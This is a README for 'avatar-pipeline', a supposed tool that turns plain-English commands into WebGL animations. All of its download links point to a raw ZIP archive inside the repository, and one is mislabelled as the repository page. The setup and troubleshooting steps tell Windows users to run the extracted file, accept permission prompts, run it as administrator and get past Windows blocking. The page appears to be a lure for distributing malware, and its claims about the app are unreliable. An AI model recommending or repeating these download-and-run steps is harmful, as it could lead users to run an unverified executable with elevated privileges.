# 🎬 avatar-pipeline - Turn text into WebGL motion

[![Download avatar-pipeline](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)

## 🖥️ What this app does

avatar-pipeline is a desktop-ready AI app that turns plain English into 3D motion on your screen. You type a command like “spin the object and fade to blue,” and the app maps it to a fixed WebGL animation. It uses a Next.js front end, a FastAPI service, and local AI flow control so the result stays stable and repeatable.

This project is built for people who want a simple way to run 3D motion demos on Windows without setting up a full developer stack.

## 📥 Download

Use this link to visit the download page and get the app:

[Download avatar-pipeline](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)

After you open the page, look for the latest release or the main download file for Windows.

## 💻 Windows setup

1. Open the download link above.
2. Download the Windows version to your computer.
3. If the file is in a ZIP folder, right-click it and choose **Extract All**.
4. Open the extracted folder.
5. Double-click the app file to start it.
6. If Windows asks for permission, choose **Yes**.
7. Wait for the app window to appear.

If the app starts in a browser window, leave that window open while you use it. If it opens a local desktop window, use that window instead.

## 🧭 First run

When the app opens for the first time, it may need a short setup pass.

1. Wait while the app loads its local services.
2. If you see a settings panel, keep the default values.
3. If you see a field for an API key, enter the key from your Groq account.
4. Save the settings.
5. Refresh the app if it asks you to.

The app uses this connection so it can read your command and turn it into a fixed animation plan.

## ✍️ How to use it

Use short commands in plain language. Keep the request simple and direct.

Examples:

- rotate the object left
- make the scene glow blue
- bounce the model twice
- move the camera closer
- fade in the avatar
- spin fast and stop
- tilt the model forward
- pulse the lights on beat

You can combine actions in one line:

- spin the cube, then zoom in
- fade to green and move left
- rotate slowly and add a pulse effect

The app reads the text, builds a simple action path, and sends it to the 3D scene.

## 🎮 What you can do

avatar-pipeline is useful for quick 3D motion tasks such as:

- WebGL motion tests
- simple avatar moves
- scene changes based on text
- demo clips for 3D tools
- repeatable animation steps
- basic interaction previews
- fast motion prototyping

The goal is not free-form art. The goal is clear and repeatable motion from plain text.

## ⚙️ System requirements

For smooth use on Windows, aim for this setup:

- Windows 10 or Windows 11
- 8 GB RAM or more
- A modern web browser
- A GPU that supports WebGL
- 2 GB free disk space
- Internet access for first-time setup
- A valid Groq API key if the app asks for one

For best results, close large apps before you run avatar-pipeline. This helps the browser and local service keep more memory free.

## 📁 Main parts of the app

This project uses a few common tools under the hood:

- **Next.js 16** for the app screen
- **FastAPI** for the local service layer
- **Docker** for repeatable backend setup
- **Three.js** for 3D rendering
- **React Three Fiber** for the scene
- **React Three Drei** for scene helpers
- **Pydantic v2** for clean data checks
- **Groq API** for language handling
- **Llama-3.3** for text control logic
- **JSON mode** for structured output

You do not need to manage these parts by hand. The app handles them during normal use.

## 🧩 What to expect in the interface

You will usually see a simple layout with:

- a text box for your command
- a run or apply button
- a 3D preview area
- a status line for load progress
- basic settings for the local engine

Some builds may also include a command history panel, so you can repeat earlier actions.

## 🔒 Privacy and local use

avatar-pipeline is built to run with a local app flow. Your command is used to create motion steps for the 3D scene. If you connect an AI key, the app may send your text to the service tied to that key. Keep your setup simple and use only the account you want linked to the app.

## 🛠️ Troubleshooting

### App does not open

- Check that the file finished downloading
- Move the folder to your Desktop
- Right-click the app and choose **Run as administrator**
- Make sure Windows did not block the file

### Blank screen

- Refresh the app window
- Wait for the local service to finish loading
- Close and open the app again
- Check that your browser supports WebGL

### Command does not work

- Use shorter text
- Remove extra words
- Try one action at a time
- Save your settings again
- Check your API key if the app asks for one

### 3D preview looks broken

- Update your graphics driver
- Close other GPU-heavy apps
- Restart the app
- Try a different browser if the app opens in one

## 🧪 Example commands to try

- rotate the avatar 90 degrees
- make the cube pulse three times
- fade the model in and move it up
- spin the scene and change the light to red
- zoom in and hold the camera still
- slide left, then stop and glow

These commands are short on purpose. Simple wording helps the app build a clean animation path.

## 🏷️ Topics covered

- 3D web
- Docker
- FastAPI
- GLTF animations
- Groq API
- JSON mode
- Llama-3.3
- natural language processing
- Next.js 16
- Pydantic v2
- Python 3.14
- React Three Fiber
- React Three Drei
- Three.js
- TypeScript
- WebGL

## 📌 Where to get the app

Use the main repository page to download and run the Windows build:

[https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)

## 🧷 Basic use flow

1. Download the app from the link above
2. Open the file on Windows
3. Wait for the local service to load
4. Enter a short command
5. Press the button to run the animation
6. Watch the 3D result in the preview area